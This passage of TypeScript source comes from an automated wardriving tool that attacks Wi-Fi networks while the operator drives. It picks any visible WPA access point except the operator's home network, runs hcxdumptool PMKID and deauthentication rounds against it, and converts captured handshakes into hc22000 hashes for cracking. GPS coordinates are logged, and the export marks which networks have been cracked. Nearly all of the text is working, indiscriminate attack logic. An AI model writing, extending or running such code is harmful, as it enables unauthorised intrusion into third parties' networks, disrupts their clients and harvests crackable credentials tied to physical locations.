        lastAttackAt: 0,
        lastDeauthAt: 0,
        cooldownUntil: 0,
        eapolFrames: 0,
        captured: false,
        method: "",
        capFile: "",
        hashFile: "",
        lastRssi: -100,
        bestRssi: -100,
        lastSeen: 0,
        firstSeen: Date.now(),
        clients: new Set(),
        channel: 0,
        packets: 0,
      };
      this.apState.set(bssid, st);
    }
    return st;
  }

  // Called on every beacon from an AP: if the AP deserves a shot, schedule
  // an attack round (PMKID primary; deauth fallback gated by speed).
  private maybeAttack(bssid: string): void {
    if (!this.running || this.attackBusy) return;
    if (this.attackBssid && Date.now() < this.attackUntil) return;
    const ap = this.air.get(bssid);
    if (!ap) return;
    const st = this.stateFor(bssid);
    if (st.captured || st.status === "exhausted") return;
    if (ap.security === "OPEN") {
      st.status = "open";
      return;
    }
    const ssid = ap.ssid;
    if (!ssid || ssid === "(oculta)") return;
    if (this.knownHandshakeSsids.has(ssid)) {
      st.status = "captured"; // covered by another AP of this SSID
      return;
    }
    // HOME NETWORK GUARD: never attack the SSID Akbal is connected through.
    if (this.homeSsid && ssid === this.homeSsid) {
      st.status = "open"; // neutral status — excluded from targeting
      return;
    }
    if (Date.now() < st.cooldownUntil) return;
    if (st.attempts >= MAX_ATTEMPTS) {
      st.status = "exhausted";
      return;
    }
    // Cross-session budget: an AP already attacked MAX_ATTEMPTS times EVER
    // (hist total) is exhausted for this session too — the DB carries the
    // lesson; don't re-burn the radio on it.
    const hist = driveDb.methodHistory(bssid);
    if (hist.pmkid + hist.deauth >= MAX_ATTEMPTS) {
      st.status = "exhausted";
      return;
    }
    if (ap.bestRssi < RSSI_GATE_DBM) return; // too weak while moving
    if (this.attackBssid) return;
    void this.attackAp(ap, st);
  }

  async attackApExternal(bssidRaw: string, method?: "pmkid" | "deauth"): Promise<{ ok: boolean; error?: string }> {
    const bssid = sanitizeMac(bssidRaw);
    if (!bssid) return { ok: false, error: "BSSID inválido" };
    if (!this.running) return { ok: false, error: "Wardrive no está activo" };
    if (this.demo) return { ok: false, error: "Demo: no hay radio que atacar" };
    if (this.attackBusy) return { ok: false, error: "Hay un ataque en curso — esperá que termine" };
    const ap = this.air.get(bssid);
    if (!ap) return { ok: false, error: "El objetivo no está visible en el aire ahora" };
    if (this.homeSsid && ap.ssid === this.homeSsid) {
      return { ok: false, error: "Ese SSID es la red protegida de Akbal — nunca se ataca" };
    }
    const st = this.stateFor(bssid);
    if (st.captured || this.knownHandshakeSsids.has(ap.ssid)) {
      return { ok: false, error: "Este SSID ya tiene handshake capturado" };
    }
    // Manual override: ignore cooldown/exhaustion gates — the operator
    // DECIDED to spend the radio here (the auto-scheduler keeps honoring
    // them for its own picks).
    void method; // same PMKID→deauth smart round either way
    void this.attackAp(ap, st);
    return { ok: true };
  }

  // One attack round against ONE AP.
  //
  // ROUND BUDGET (the 20-min-run lesson): each AP gets AT MOST one PMKID
  // window + one deauth window per session TOTAL, regardless of history.
  // Previously the engine re-attacked the same 5 visible APs forever
  // (193 rounds ≈ 3.4h of radio) while fresh targets starved and the
  // hopper never left ch1 — 20 min of driving produced 0 handshakes.
  // Aggro pass (driving efficiency): with short windows + 12s cooldown the
  // engine now cycles targets fast while in range; the historical budget
  // still prevents the burn-on-one-AP failure mode.
  // Dual mode: the attack radio leaves its discovery capture for the round
  // (hcxdumptool needs the iface) and rejoins the air afterwards, even when
  // the round exits early. Single mode has no attack entry and is unchanged.
  private async attackAp(ap: AirAp, st: ApSessionState): Promise<void> {
    if (this.discovery.length === 0 || !this.running || this.attackBusy) return;
    const entry = this.attackEntry;
    if (entry) {
      const capture = entry.capture;
      entry.capture = null; // before stop(): its exit event must be ignored
      capture?.stop();
    }
    try {
      await this.attackApRound(ap, st);
    } finally {
      if (entry && this.running && this.attackEntry === entry && !entry.capture) {
        this.startCaptureFor(entry);
      }
    }
  }

  private async attackApRound(ap: AirAp, st: ApSessionState): Promise<void> {
    if (this.discovery.length === 0 || !this.running || this.attackBusy) return;
    this.attackBusy = true;
    this.roundStartedAt = Date.now();
    this.attackBssid = ap.bssid;
    this.attackChannel = ap.channel || this.currentChannel || 1;
    // One window + settle margin, so the UI/hopper know exactly how long
    // the radio is committed.
    this.attackUntil = Date.now() + PMKID_WINDOW_MS + DEAUTH_WINDOW_MS + 15_000;
    st.status = "attacking";
    st.attempts += 1;
    driveDb.recordAttempt(ap.bssid, "pmkid");
    this.attackMethod = "pmkid";
    let capturedHere = false;

    // Cross-session method memory: if this BSSID was already attacked with
    // a method in a PAST session, start with the OTHER one — no point
    // burning a 30s PMKID window on an AP that already proved it ignores
    // PMKID requests, and no point deauthing one that already handed over
    // its PMKID request without answering.
    const hist = driveDb.methodHistory(ap.bssid);
    const triedPmkid = hist.pmkid > 0;
    const triedDeauth = hist.deauth > 0;
    let startWithDeauth = triedDeauth && !triedPmkid; // PMKID failed before → deauth first
    const skipPmkid = triedPmkid && !triedDeauth; // AP already ignored PMKID
    const skipDeauth = triedDeauth && !triedPmkid; // deauth already failed
    if (startWithDeauth || (skipPmkid && triedDeauth)) {
      // history says PMKID fails on this AP — go straight to deauth
      startWithDeauth = true;
    }

    // ── Round 1: the method the history favours (PMKID by default) ───────
    const sessionDir = this.sessionDir;
    const ringDir = this.ringDir;
    if (!sessionDir || !ringDir) return;

    const doPmkid = !skipPmkid;
    const doDeauth = !skipDeauth;

    if (startWithDeauth && doDeauth) {
      driveDb.recordAttempt(ap.bssid, "deauth");
      capturedHere = await this.runDeauthRound(ap, st);
    } else if (doPmkid) {
      const prefix = ap.bssid.replace(/:/g, "").toLowerCase();
      const pcapngPath = path.join(sessionDir, `${prefix}-pmkid.pcapng`);
      const bpfFile = `${pcapngPath}.bpf`;
      const bpfPath = await writeBpfForAp(ap.bssid, bpfFile);
      if (bpfPath) {
        // SINGLE mode: pause the discovery pipeline (it holds the iface in
        // monitor mode). DUAL mode: the attack radio is dedicated — the
        // discovery capture keeps running untouched.
        if (!this.dualRadio) {
          this.stopCaptures();
          this.hopTimerPause = true;
        }
        try {
          capturedHere = await this.runPmkidRound(ap, pcapngPath, bpfPath, st);
        } finally {
          if (!this.dualRadio) this.hopTimerPause = false;
        }
      } else {
        console.warn(`[wardrive] PMKID skip ${ap.ssid}: BPF compile failed`);
      }
    }
    // ── Round 2 (the other method), if round 1 didn't capture and history
    // allows it: never repeat a method this AP already ignored before.
    if (!capturedHere && this.running && !st.captured) {
      const slowEnough = this.demo || this.gpsSpeed == null || this.gpsSpeed <= DEAUTH_SPEED_MAX_KMH;
      const pmkidAlreadyTried = startWithDeauth || !doPmkid;
      const deauthAlreadyTried = !startWithDeauth && skipDeauth;
      if (slowEnough && !deauthAlreadyTried && (!startWithDeauth || hist.deauth === 0 || hist.pmkid > 0)) {
        driveDb.recordAttempt(ap.bssid, "deauth");
        capturedHere = await this.runDeauthRound(ap, st);
      } else if (slowEnough && pmkidAlreadyTried && !triedPmkid) {
        // deauth was first (history) — PMKID as the second shot
        driveDb.recordAttempt(ap.bssid, "pmkid");
        const prefix = ap.bssid.replace(/:/g, "").toLowerCase();
        const pcapngPath = path.join(sessionDir, `${prefix}-pmkid.pcapng`);
        const bpfFile = `${pcapngPath}.bpf`;
        const bpfPath = await writeBpfForAp(ap.bssid, bpfFile);
        if (bpfPath) {
          if (!this.dualRadio) {
            this.stopCaptures();
            this.hopTimerPause = true;
          }
          try {
            capturedHere = await this.runPmkidRound(ap, pcapngPath, bpfPath, st);
          } finally {
            if (!this.dualRadio) this.hopTimerPause = false;
          }
        }
      }
    }

    // SINGLE mode only: restart the discovery pipeline once, at the very
    // end (each round leaves the iface in whatever mode hcxdumptool left
    // it; DriveCapture re-enters monitor mode itself). In DUAL mode the
    // discovery capture never stopped.
    if (!this.dualRadio && this.running) this.startCaptures();

    this.attackBssid = null;
    this.attackBusy = false;
    if (this.running && !st.captured) {
      st.status = st.attempts >= MAX_ATTEMPTS ? "exhausted" : "attack-scheduled";
      st.cooldownUntil = Date.now() + ATTACK_COOLDOWN_MS;
    }
    this.broadcastStatus();
  }

  // One hcxdumptool PMKID window against ONE AP. Resolves true when the
  // round produced an extractable capture (validated with hcxpcapngtool).
  private async runPmkidRound(ap: AirAp, pcapngPath: string, bpfPath: string, st: ApSessionState): Promise<boolean> {
    // DUAL: the round runs on the dedicated attack radio (discovery keeps
    // running on its own radio); SINGLE: the shared primary radio (blind window).
    const atkIface = this.dualRadio && this.attackIface ? this.attackIface : this.primaryIface();
    if (!this.sessionDir || !atkIface) return false;
    // hcxdumptool needs the iface DOWN and NOT in monitor mode — it does
    // its own mode/MAC/channel dance. Drop our monitor setup first.
    await this.downIface(atkIface);
    try {
      fs.rmSync(pcapngPath, { force: true });
    } catch {
      // non-fatal
    }
    const runner = new PmkidDriveRunner(atkIface, ap.bssid, pcapngPath, ap.channel || 1, PMKID_WINDOW_MS, bpfPath);
    this.pmkidRunner = runner;
    runner.on("hit", () => {
      // [PMKID:...] marker — give hcxdumptool a beat to write the file; the
      // --exitoneapol flag exits on its own, stop() here is the safety net.
      setTimeout(() => {
        if (this.pmkidRunner === runner) runner.stop();
      }, 2_000);
    });
    runner.on("log", (line: string) => {
      if (line.includes("PMKID") || /EAPOL/i.test(line)) console.log(`[wardrive] hcx ${ap.ssid}: ${line.slice(0, 90)}`);
    });
    const exited = new Promise<void>((resolve) => runner.on("exit", () => resolve()));
    this.activity(`Atacando PMKID → ${ap.ssid} (ch${ap.channel})`, "attack");
    console.log(`[wardrive] PMKID round → ${ap.ssid} (${ap.bssid}) ch${ap.channel} ${PMKID_WINDOW_MS}ms ${this.dualRadio ? "[attack radio]" : "[shared radio]"}`);
    runner.start();
    await Promise.race([exited, sleep(PMKID_WINDOW_MS + 8_000)]);
    runner.stop();
    this.pmkidRunner = null;
    await sleep(ATTACK_SETTLE_MS);
    const ok = await this.validateRound(ap, st, pcapngPath, "pmkid");
    this.logRound(ap, "pmkid", PMKID_WINDOW_MS, ok, st?.eapolFrames ?? 0);
    return ok;
  }

  // Secondary mechanism: deauth + capture in ONE window. Same writer
  // split as the PMKID round: hcxdumptool attacks (no -w), dumpcap writes.
  private async runDeauthRound(ap: AirAp, st: ApSessionState): Promise<boolean> {
    const atkIface = this.dualRadio && this.attackIface ? this.attackIface : this.primaryIface();
    if (!atkIface || !this.running || !this.sessionDir) return false;
    st.lastDeauthAt = Date.now();
    const prefix = ap.bssid.replace(/:/g, "").toLowerCase();
    const pcapngPath = path.join(this.sessionDir, `${prefix}-deauth.pcapng`);
    try {
      fs.rmSync(pcapngPath, { force: true });
    } catch {
      // non-fatal
    }
    const bpfFile = await writeBpfForAp(ap.bssid, `${pcapngPath}.bpf`);
    if (!bpfFile) return false;
    // SINGLE mode: hcxdumptool owns the shared iface — pause discovery +
    // hopper. DUAL mode: the attack radio is dedicated, discovery continues.
    if (!this.dualRadio) {
      this.stopCaptures();
      this.hopTimerPause = true;
    }
    try {
      await this.downIface(atkIface);
      const runner = new PmkidDriveRunner(
        atkIface,
        ap.bssid,
        pcapngPath,
        ap.channel || 1,
        DEAUTH_WINDOW_MS,
        bpfFile,
      );
      // Same runner class but WITH deauths: flag off exitoneapol so the
      // window captures the full 4-way after each client reconnects.
      this.pmkidRunner = runner; // reuse the handle so stop() reaches it
      this.attackMethod = "deauth";
      const exited = new Promise<void>((resolve) => runner.on("exit", () => resolve()));
      this.activity(`Atacando DEAUTH → ${ap.ssid} (ch${ap.channel})`, "attack");
      console.log(`[wardrive] DEAUTH round → ${ap.ssid} (${ap.bssid}) ch${ap.channel} ${DEAUTH_WINDOW_MS}ms ${this.dualRadio ? "[attack radio]" : "[shared radio]"}`);
      runner.startWithDeauth();
      await Promise.race([exited, sleep(DEAUTH_WINDOW_MS + 8_000)]);
      runner.stop();
      this.pmkidRunner = null;
      await sleep(ATTACK_SETTLE_MS);
      const ok = await this.validateRound(ap, st, pcapngPath, "deauth");
      this.logRound(ap, "deauth", DEAUTH_WINDOW_MS, ok, st?.eapolFrames ?? 0);
      return ok;
    } finally {
      // The unified restart at the end of attackAp() brings discovery back
      // (single mode); this finally only guarantees we never leave the
      // iface owned by a dead hcxdumptool.
    }
  }

  // Per-round metrics row — the 1-vs-2-adapter comparison dataset. blind_ms
  // = how long the DISCOVERY pipeline was down for this round: full window
  // + overhead in single mode, ≈0 in dual mode.
  private logRound(
    ap: AirAp,
    method: string,
    windowMs: number,
    ok: boolean,
    eapolPairs: number,
    aborted = false,
  ): void {
    const blind = this.dualRadio ? 0 : windowMs + ATTACK_SETTLE_MS;
    driveDb.recordAttackRound({
      bssid: ap.bssid,
      ssid: ap.ssid,
      method,
      mode: this.dualRadio ? "dual" : "single",
      windowMs,
      result: aborted ? "aborted" : ok ? "captured" : "failed",
      blindMs: blind,
      eapolPairs: Math.max(0, eapolPairs),
    });
  }

  // Post-window validation, shared by both methods: the attack-window
  // dumpcap wrote EVERYTHING on the channel — extract this AP's frames
  // with tshark, convert with hcxpcapngtool --all, and decide.
  private async validateRound(
    ap: AirAp,
    st: ApSessionState,
    fullPcapng: string,
    method: string,
  ): Promise<boolean> {
    const sessionDir = this.sessionDir;
    if (!sessionDir) return false;
    const prefix = ap.bssid.replace(/:/g, "").toLowerCase();
    const perApPath = path.join(sessionDir, `${prefix}-${method}.pcapng`);
    const hashPath = path.join(sessionDir, `${prefix}-${method}.hc22000`);
    const hashFileBase = path.basename(hashPath);
    const capFileBase = path.basename(perApPath);

    const conv = await convertCaptureToHash(fullPcapng, hashPath);
    if (conv.ok) {
      st.captured = true;
      st.eapolFrames += Math.max(conv.eapolPairs, conv.pmkidCount);
      st.method = (conv.pmkidCount > 0 ? "pmkid" : method) as ApSessionState["method"];
      st.capFile = path.basename(fullPcapng);
      st.hashFile = hashFileBase;
      this.markCaptured(ap, st, method, fullPcapng, hashPath);
      return true;
    }
    // hcx didn't find hashable pairs directly (full-channel capture with
    // several APs' handshakes mixed can confuse the parser): extract this
    // AP's frames alone and retry.
    const ex = await extractApFrames(ap.bssid, fullPcapng, perApPath);
    if (ex.ok) {
      const conv2 = await convertCaptureToHash(perApPath, hashPath);
      if (conv2.ok) {
        st.captured = true;
        st.eapolFrames += Math.max(conv2.eapolPairs, conv2.pmkidCount);
        st.method = (conv2.pmkidCount > 0 ? "pmkid" : method) as ApSessionState["method"];
        st.capFile = capFileBase;
        st.hashFile = hashFileBase;
        this.markCaptured(ap, st, method, perApPath, hashPath);
        return true;
      }
    }
    this.activity(`${method === "pmkid" ? "PMKID sin respuesta" : "Deauth sin handshake"} → ${ap.ssid}`, "info");
    return false;
  }

  private async markCaptured(
    ap: AirAp,
    st: ApSessionState,
    method: string,
    capPath: string,
    hashPath: string,
  ): Promise<void> {
    const ssid = ap.ssid;
    if (!ssid || ssid === "(oculta)") return;
    this.knownHandshakeSsids.add(ssid);
    this.sessionNewHandshakeSsids.add(ssid);
    driveDb.markHandshake({
      ssid,
      bssid: ap.bssid,
      security: ap.security,
      method,
      capFile: path.basename(capPath),
      hashFile: path.basename(hashPath),
      sessionDir: this.sessionDir || "",
      sessionId: this.sessionId || "",
      lat: this.gpsLat,
      lon: this.gpsLon,
    });
    this.activity(`🏴 Handshake capturado → ${ssid} (${method})`, "captured");
    console.log(`[wardrive] HANDSHAKE ${ssid} (${ap.bssid}) via ${method}`);
  }

  private downIface(iface: string): Promise<void> {
    return execFileAsync("sudo", ["-n", "ip", "link", "set", iface, "down"]).then(
      () => undefined,
      () => undefined,
    );
  }

  private hopTimerPause = false;

  // ─── Activity feed (status screen) ─────────────────────────────────────
  // What the engine is doing right now, one line per event, newest first.
  // Kept small (last 8) — the web status screen shows it as a live ticker
  // and the LCD uses the first entry as its status line.
  private activityLog: { ts: number; text: string; kind: string }[] = [];

  private currentAttackLabel(): string | null {
    if (!this.attackBssid) return null;
    const ap = this.air.get(this.attackBssid);
    const ssid = ap?.ssid || this.attackBssid;
    const verb = this.attackMethod === "pmkid" ? "PMKID" : "DEAUTH";
    return `${verb} → ${ssid}`;
  }

  private activity(text: string, kind = "info"): void {
    this.activityLog.unshift({ ts: Date.now(), text, kind });
    if (this.activityLog.length > 12) this.activityLog.pop();
    this.broadcastStatus();
  }


  // ─── Session tick: GPS ingest, track points, counters ────────────────────

  private startTimers(): void {
    if (this.tickTimer) return;
    this.tickTimer = setInterval(() => void this.tick(), SESSION_TICK_MS);
    this.scanTimer = setInterval(() => this.pickTarget(), TARGET_SCAN_INTERVAL_MS);
    // Demo capture simulation only when demo is actually active.
    if (this.demo) {
      this.demoCaptureTimer = setInterval(() => this.demoCapture(), 45_000);
    }
  }

  private stopTimers(): void {
    if (this.tickTimer) {
      clearInterval(this.tickTimer);
      this.tickTimer = null;
    }
    if (this.scanTimer) {
      clearInterval(this.scanTimer);
      this.scanTimer = null;
    }
    if (this.demoCaptureTimer) {
      clearInterval(this.demoCaptureTimer);
      this.demoCaptureTimer = null;
    }
    if (this.hopTimer) {
      clearTimeout(this.hopTimer);
      this.hopTimer = null;
    }
  }

  private async tick(): Promise<void> {
    if (!this.running) return;
    if (this.demo) {
      this.demoTick();
      return;
    }
    // Home-network watchdog tick: if the connection dropped mid-drive,
    // bring the SAME network back (never another saved one).
    void checkHomeNetwork().catch(() => {});
    await this.readLiveGps();
    this.maybeRecordPoint();
    if (this.sessionId) {
      driveDb.updateSession(this.sessionId, {
        distanceM: Math.round(this.distanceM),
        points: this.points,
        networks: this.sessionNewSsids.size,
        handshakes: this.sessionNewHandshakeSsids.size,
      });
    }
  }

  private async readLiveGps(): Promise<void> {
    try {
      const gps = await getGpsStatus();
      this.gpsHasFix = gps.hasFix;
      this.gpsLat = gps.hasFix ? gps.latitude : null;
      this.gpsLon = gps.hasFix ? gps.longitude : null;
      this.gpsSpeed = gps.speedKmh;
      this.gpsHeading = gps.headingDeg;
      this.gpsHdop = gps.hdop;
      this.gpsSatsUsed = gps.satellitesUsed;
      this.gpsSatsInView = gps.satellitesInView;
      this.gpsSatsNeeded = gps.satellitesNeeded;
      this.gpsSatellites = gps.satellites;
      this.gpsError = gps.hasFix ? "" : gps.error || "Sin fix GPS";
    } catch {
      this.gpsError = "GPS sin datos";
    }
  }

  private maybeRecordPoint(): void {
    if (!this.gpsHasFix || this.gpsLat == null || this.gpsLon == null) return;
    const now = Date.now();
    const moved = this.lastPointLat != null && this.lastPointLon != null
      ? haversineM(this.lastPointLat, this.lastPointLon, this.gpsLat, this.gpsLon)
      : Infinity;
    if (this.lastPointAt === 0) {
      this.recordPoint(now, true);
      return;
    }
    if (moved >= POINT_MIN_MOVE_M) {
      this.recordPoint(now, true);
      return;
    }
    if (now - this.lastPointAt >= POINT_MAX_DT_MS) {
      // Parked: still emit a point every POINT_MAX_DT_MS so the timeline
      // doesn't gap for minutes, but NOT moving=true — see recordPoint.
      this.recordPoint(now, false);
    }
  }

  // moving=true: a real >=6m displacement — record the actual GPS fix and
  // extend the odometer. moving=false: a time-triggered "still parked"
  // heartbeat — anchor the point to the LAST KNOWN STABLE position instead
  // of the current (GPS-noise) reading. Letting the anchor itself drift a
  // couple of meters every 20s while stationary was the bug behind the
  // car's track "circling" a parked spot on the map: each noisy anchor
  // became the new reference for the next 6m check, so pure GPS jitter
  // kept reading back as movement in random directions.
  private recordPoint(now: number, moving: boolean): void {
    const lat = moving || this.lastPointLat == null ? this.gpsLat! : this.lastPointLat;
    const lon = moving || this.lastPointLon == null ? this.gpsLon! : this.lastPointLon;
    if (moving && this.lastPointLat != null && this.lastPointLon != null) {
      this.distanceM += haversineM(this.lastPointLat, this.lastPointLon, lat, lon);
    }
    this.lastPointAt = now;
    this.lastPointLat = lat;
    this.lastPointLon = lon;
    this.points += 1;
    if (this.sessionId) {
      driveDb.addTrackPoint(this.sessionId, now, lat, lon, this.gpsSpeed, this.gpsHeading, this.gpsHdop);
    }
  }

  // Demo feed (platform mode) ─────────────────────────────────────────────

  private demoCaptureTimer: ReturnType<typeof setInterval> | null = null;

  private startDemoFeed(): void {
    if (!this.tickTimer) {
      this.tickTimer = setInterval(() => this.demoTick(), SESSION_TICK_MS);
      this.scanTimer = setInterval(() => this.pickTarget(), TARGET_SCAN_INTERVAL_MS);
      this.demoCaptureTimer = setInterval(() => this.demoCapture(), 45_000);
    }
    this.demoT = 0;
  }

  private demoTick(): void {
    this.demoT += 1;
    const t = this.demoT;
    // Drive a slow loop around the Zócalo (demo fix, same as gps.ts).
    const baseLat = 19.4326 + Math.sin(t / 120) * 0.0012;
    const baseLon = -99.1332 + Math.cos(t / 90) * 0.0015;
    this.gpsHasFix = true;
    this.gpsLat = baseLat;
    this.gpsLon = baseLon;
    this.gpsSpeed = 18 + Math.round(Math.sin(t / 30) * 8);
    this.gpsHeading = (t * 3) % 360;
    this.gpsHdop = 1.2;
    this.gpsSatsUsed = 7;
    this.gpsSatsInView = 9;
    this.gpsError = "";
    this.currentChannel = [1, 6, 11][Math.floor(t / 5) % 3];
    // Synthetic APs pop in as we "drive".
    const n = 6;
    for (let i = 0; i < n; i++) {
      const seed = `${i}`;
      const bssid = `DE:MO:0${(i % 10)}:0${(i % 10)}:0${(i % 10)}:0${(i % 10)}`;
      const ssid = ["Red_Cafe", "CasaVecina", "Net_2G", "TiendaMovil", "Guest_Fast", "MiRed_5G"][i % n];
      const security = ["WPA2/3", "WPA2/3", "WPA2/3", "OPEN", "WPA", "WPA2/3"][i % n];
      const rssi = -45 - ((t + i * 17) % 40);
      const existing = this.air.get(bssid);
      if (existing) {
        existing.rssi = rssi;
        existing.bestRssi = Math.max(existing.bestRssi, rssi);
        existing.lastSeen = Date.now();
        existing.packets += 1;
      } else {
        this.air.set(bssid, {
          bssid,
          ssid: `${ssid}_${seed}`,
          channel: [1, 3, 6, 9, 11, 13][i % 6],
          rssi,
          bestRssi: rssi,
          security,
          packets: 1,
          firstSeen: Date.now(),
          lastSeen: Date.now(),
        });
        driveDb.recordNetwork({
          bssid,
          ssid: `${ssid}_${seed}`,
          security,
          channel: [1, 3, 6, 9, 11, 13][i % 6],
          rssi,
          lat: this.gpsLat,
          lon: this.gpsLon,
        });
        this.sessionNewSsids.add(`${ssid}_${seed}`);
      }
    }
    this.maybeRecordPoint();
  }

  // Demo deauth/capture cycle: mark one eligible AP "captured" every ~45s.
  private demoCapture(): void {
    for (const [, ap] of this.air) {
      if (ap.security === "OPEN") continue;
      if (this.knownHandshakeSsids.has(ap.ssid)) continue;
      const st = this.stateFor(ap.bssid);
      if (st.captured || st.attempts === 0) continue;
      st.captured = true;
      st.status = "captured";
      st.method = "deauth";
      this.knownHandshakeSsids.add(ap.ssid);
      this.sessionNewHandshakeSsids.add(ap.ssid);
      driveDb.markHandshake({
        ssid: ap.ssid,
        bssid: ap.bssid,
        security: ap.security,
        method: "deauth",
        capFile: "",
        hashFile: "",
        sessionDir: "",
        sessionId: this.sessionId || "",
        lat: this.gpsLat,
        lon: this.gpsLon,
      });
      this.broadcastStatus();
      return;
    }
  }

  private pickTarget(): void {
    // Targeting rules (docs/wardrive.md + the 20-min-run lesson):
    //   1. NEW SSIDs first: a network never attacked before beats a
    //      previously-attempted one (that attempt failed — don't starve
    //      fresh targets behind old failures). Only when NO new SSIDs are
    //      in range do we fall back to retrying the old ones.
    //   2. Within each tier: priority SSIDs (operator's recurring labs)
    //      first, then by best RSSI.
    //   3. SSIDs with a handshake are NEVER re-attacked — the dedup check
    //      (knownHandshakeSsids, table-driven) skips them entirely.
    //   4. Driving-speed aggression: the scheduler re-picks THE MOMENT the
    //      radio is free (TARGET_SCAN_INTERVAL_MS) and the attack windows
    //      are short — more APs get a shot while still in range. The
    //      AP-level cooldown is the only spacing left.
    if (!this.running) return;
    if (this.demo) {
      this.demoCapture();
      return;
    }
    if (this.attackBusy || (this.attackBssid && Date.now() < this.attackUntil)) return;
    const candidates: { ap: AirAp; st: ApSessionState; tier: number; prio: number }[] = [];
    for (const [, ap] of this.air) {
      if (ap.security === "OPEN" || ap.security === "UNKNOWN") continue;
      if (!ap.ssid || ap.ssid === "(oculta)") continue;
      if (this.knownHandshakeSsids.has(ap.ssid)) continue; // already have it
      // HOME NETWORK GUARD: the SSID wlan0 is connected to is untouchable.
      if (this.homeSsid && ap.ssid === this.homeSsid) continue;
      const st = this.stateFor(ap.bssid);
      if (st.captured || st.status === "exhausted" || st.attempts >= MAX_ATTEMPTS) continue;
      if (Date.now() < st.cooldownUntil) continue;
      const gate = this.prioritySsids.has(ap.ssid) ? RSSI_GATE_KNOWN_DBM : RSSI_GATE_DBM;
      if (ap.bestRssi < gate) continue;
      // tier 0 = never attacked in any session (fresh); tier 1 = tried
      // before (attempts > 0 in the DB) and failed
      const hist = driveDb.methodHistory(ap.bssid);
      const tier = hist.pmkid + hist.deauth > 0 ? 1 : 0;
      candidates.push({ ap, st, tier, prio: this.prioritySsids.has(ap.ssid) ? 1 : 0 });
    }
    // Fresh targets first; among equals, operator-priority SSIDs; then signal.
    candidates.sort((a, b) => a.tier - b.tier || b.prio - a.prio || b.ap.bestRssi - a.ap.bestRssi);
    if (candidates.length > 0 && !this.attackBssid) {
      void this.attackAp(candidates[0].ap, candidates[0].st);
    }
  }

  // ─── Status for the web UI ──────────────────────────────────────────────

  getStatus(): DriveStatus {
    const dbStats = driveDb.stats();
    // ALL APs seen this session (the web list is scrollable, newest attack
    // first: attacking > attacked-with-handshake > attacked > fresh).
    const order = { attacking: 0, "attack-scheduled": 1, captured: 2, exhausted: 3, fresh: 4, open: 5 };
    const rank = (s: string | undefined) => order[(s || "fresh") as keyof typeof order] ?? 6;
    const recent: DriveApView[] = [...this.air.values()]
      .map((ap) => {
        const st = this.apState.get(ap.bssid);
        return { ap, st, view: this.apView(ap, st) };
      })
      .sort((a, b) => {
        const ra = order[a.view.status] ?? 9;
        const rb = order[b.view.status] ?? 9;
        if (ra !== rb) return ra - rb;
        return b.ap.bestRssi - a.ap.bestRssi;
      })
      .map((e) => e.view);
    return {
      running: this.running,
      session:
        this.running && this.sessionId
          ? {
              id: this.sessionId,
              startedAt: this.startedAt,
              durationSec: Math.round((Date.now() - this.startedAt) / 1000),
              distanceMeters: Math.round(this.distanceM),
              points: this.points,
            }
          : null,
      gps: {
        hasFix: this.gpsHasFix,
        latitude: this.gpsLat,
        longitude: this.gpsLon,
        speedKmh: this.gpsSpeed,
        headingDeg: this.gpsHeading,
        hdop: this.gpsHdop,
        satellitesUsed: this.gpsSatsUsed,
        satellitesInView: this.gpsSatsInView,
        satellitesNeeded: this.gpsSatsNeeded,
        satellites: this.gpsSatellites,
        error: this.gpsError,
      },
      iface: this.primaryIface(),
      discoveryIfaces: this.discovery.map((r) => r.iface),
      preferredMac: this.preferredMac,
      radioMode: this.radioMode,
      dualRadio: this.dualRadio,
      attackIface: this.dualRadio ? this.attackIface : null,
      activeRadios: activeRadiosOf(this.discovery.map((r) => r.iface), this.dualRadio ? this.attackIface : null),
      radiosConnected: this.running ? this.radiosConnected : 0,
      homeSsid: this.homeSsid,
      error: this.error,
      channel: this.currentChannel,
      // Live activity feed for the status screen: what the engine is doing
      // right now, per target, newest first.
      activity: this.activityLog.slice(0, 8),
      currentAttack: this.currentAttackLabel(),
      stats: {
        aps: this.air.size,
        unique: dbStats.unique,
        newThisSession: this.sessionNewSsids.size,
        handshakes: dbStats.handshakes,
        newHandshakes: this.sessionNewHandshakeSsids.size,
        points: this.points,
      },
      recent,
    };
  }

  private apView(ap: AirAp, st: ApSessionState | undefined): DriveApView {
    const known = this.knownHandshakeSsids.has(ap.ssid);
    const hist = driveDb.methodHistory(ap.bssid);
    return {
      bssid: ap.bssid,
      ssid: ap.ssid,
      channel: ap.channel,
      rssi: ap.rssi,
      security: ap.security as DriveApView["security"],
      vendor: lookupVendorOrRandom(ap.bssid).vendor,
      firstSeenTs: ap.firstSeen,
      lastSeenTs: ap.lastSeen,
      packets: ap.packets,
      bestRssi: ap.bestRssi,
      handshakeKnown: known,
      handshakeHere: st?.captured === true,
      attempts: st?.attempts ?? 0,
      pmkidAttempts: hist.pmkid,
      deauthAttempts: hist.deauth,
      lastMethod: hist.last,
      eapolFrames: st?.eapolFrames ?? 0,
      status: st?.captured
        ? "captured"
        : ap.security === "OPEN"
          ? "open"
          : (st?.status as DriveApView["status"]) || "fresh",
    };
  }

  // ─── Exports ───────────────────────────────────────────────────────────

  sessionCsv(sessionId: string): string | null {
    if (!sessionId.startsWith("drive-") || sessionId.includes("/") || sessionId.includes("\\")) return null;
    // Full historial CSV (the user-facing export): GPS position of the
    // sighting, SSID, MAC, capture time, capture place, handshake state and
    // the handshake artifact file name.
    const nets = driveDb.sessionNetworks(sessionId);
    if (nets.length === 0) return null;
    const lines = [
      "MAC,SSID,Latitud,Longitud,HoraCaptura,LugarCaptura,Canal,Senal_dBm,Cifrado,Handshake,Metodo,Intentos,ArchivoHandshake,Crackeada",
    ];
    for (const n of nets) {
      const lugar = n.lat != null && n.lon != null ? `${n.lat.toFixed(6)}, ${n.lon.toFixed(6)}` : "";
      lines.push(
        [
          n.bssid || "",
          `"${String(n.ssid || "").replace(/"/g, '""')}"`,
          n.lat != null ? n.lat.toFixed(6) : "",
          n.lon != null ? n.lon.toFixed(6) : "",
          new Date(n.first_seen).toISOString(),
          `"${lugar}"`,
          n.channel ?? "",
          n.best_rssi ?? "",
          n.security || "",
          n.handshake ? "SI" : "NO",
          n.last_method || "",
          n.attempts || 0,
          n.handshake ? `"${n.hs_method === "pmkid" ? `${n.bssid.replace(/:/g, "").toLowerCase()}-pmkid.pcapng` : n.bssid.replace(/:/g, "").toLowerCase() + ".hc22000"}"` : "",
          n.cracked ? "SI" : "",
        ].join(","),
      );
    }
    return lines.join("\n");
  }

  sessionGpx(sessionId: string): string | null {
    if (!sessionId.startsWith("drive-") || sessionId.includes("/") || sessionId.includes("\\")) return null;
